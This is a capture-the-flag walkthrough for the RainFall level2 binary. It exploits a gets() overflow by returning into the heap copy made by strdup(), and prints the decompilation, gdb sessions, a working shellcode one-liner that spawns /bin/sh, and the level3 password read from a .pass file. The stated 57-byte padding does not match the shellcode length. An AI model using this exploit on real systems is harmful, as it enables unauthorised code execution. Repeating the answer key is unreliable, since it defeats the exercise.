# Level 02 Walkthrough

## Binary analysis

```
080484d4    char* p()
080484e2        fflush(fp: stdout)
080484ed        char var_50[0x40]
080484ed        gets(buf: &var_50)
080484ed        
08048505        if ((__return_addr & 0xb0000000) != 0xb0000000)
0804852d            puts(str: &var_50)
0804853e            return strdup(s: &var_50)
0804853e        
08048516        printf(format: "(%p)\n", __return_addr)
08048522        _exit(status: 1)
08048522        noreturn


0804853f    int32_t main(int32_t argc, char** argv, char** envp)
0804854b        return p()
```

The binary `gets()` the input of the user in a static sized buffer of 64 bytes. It then check if the EIP of the function `p()` was overwritten by an address of the stack, if not it copies the buffer with `strdup()` to the heap. We can use the return address of `strdup()` to point to our shellcode which in this case would be on the heap and not the stack.

## Exploitation

Find the offset to EIP (80 bytes) with a cyclic pattern.
```
level2@RainFall:~$ gdb -q ./level2 
Reading symbols from /home/user/level2/level2...(no debugging symbols found)...done.
(gdb) r
Starting program: /home/user/level2/level2 
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0A6Ac72Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A

Program received signal SIGSEGV, Segmentation fault.
0x37634136 in ?? ()
(gdb) 
```

We need to find the address of our copied buffer on the heap. To do so we will check the return value of `strdup()`.

```
level2@RainFall:~$ gdb -q ./level2 
Reading symbols from /home/user/level2/level2...(no debugging symbols found)...done.
(gdb) disass p
Dump of assembler code for function p:
   0x080484d4 <+0>:	push   %ebp
   0x080484d5 <+1>:	mov    %esp,%ebp
   0x080484d7 <+3>:	sub    $0x68,%esp
   0x080484da <+6>:	mov    0x8049860,%eax
   0x080484df <+11>:	mov    %eax,(%esp)
   0x080484e2 <+14>:	call   0x80483b0 <fflush@plt>
   0x080484e7 <+19>:	lea    -0x4c(%ebp),%eax
   0x080484ea <+22>:	mov    %eax,(%esp)
   0x080484ed <+25>:	call   0x80483c0 <gets@plt>
   0x080484f2 <+30>:	mov    0x4(%ebp),%eax
   0x080484f5 <+33>:	mov    %eax,-0xc(%ebp)
   0x080484f8 <+36>:	mov    -0xc(%ebp),%eax
   0x080484fb <+39>:	and    $0xb0000000,%eax
   0x08048500 <+44>:	cmp    $0xb0000000,%eax
   0x08048505 <+49>:	jne    0x8048527 <p+83>
   0x08048507 <+51>:	mov    $0x8048620,%eax
   0x0804850c <+56>:	mov    -0xc(%ebp),%edx
   0x0804850f <+59>:	mov    %edx,0x4(%esp)
   0x08048513 <+63>:	mov    %eax,(%esp)
   0x08048516 <+66>:	call   0x80483a0 <printf@plt>
   0x0804851b <+71>:	movl   $0x1,(%esp)
   0x08048522 <+78>:	call   0x80483d0 <_exit@plt>
   0x08048527 <+83>:	lea    -0x4c(%ebp),%eax
   0x0804852a <+86>:	mov    %eax,(%esp)
   0x0804852d <+89>:	call   0x80483f0 <puts@plt>
   0x08048532 <+94>:	lea    -0x4c(%ebp),%eax
   0x08048535 <+97>:	mov    %eax,(%esp)
   0x08048538 <+100>:	call   0x80483e0 <strdup@plt>
   0x0804853d <+105>:	leave  
   0x0804853e <+106>:	ret    
End of assembler dump.
(gdb) b *0x0804853d
Breakpoint 1 at 0x804853d
(gdb) r
Starting program: /home/user/level2/level2 
hello
hello

Breakpoint 1, 0x0804853d in p ()
(gdb) x/s $eax
0x804a008:	 "hello"
```

Generate a payload with shellcode, padding (offset - len(shellcode) = 57 bytes), and the target address.

## Commands used

```
(python -c 'shellcode = b"\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"; print(shellcode + b"A" * (80 - len(shellcode)) + b"\x08\x04\xa0\x08"[::-1])'; cat -) | ./level2 
```

## Result

After running the exploit, we get a shell as level3 and can read the password:

```
X�Rh//shh/bin��1�̀AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�
cat /home/user/level3/.pass
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```
